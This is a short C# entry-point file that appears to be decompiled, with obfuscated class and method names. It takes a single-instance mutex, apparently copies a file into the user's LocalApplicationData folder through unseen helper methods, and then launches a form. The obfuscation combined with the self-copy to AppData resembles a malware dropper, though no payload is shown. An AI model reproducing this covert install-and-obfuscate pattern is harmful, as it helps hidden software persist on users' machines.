using System;
using System.Threading;
using System.Windows.Forms;
using BrowserDene;

internal static class Class0
{
	public static Mutex mutex_0 = new Mutex(initiallyOwned: true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04X6FDEXZ2}");

	[STAThread]
	private static void MkbjasldQ()
	{
		if (mutex_0.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			string string_ = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Class1.string_2;
			Class1.smethod_3();
			Class1.smethod_2(Class1.string_1, string_);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			mutex_0.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}
}
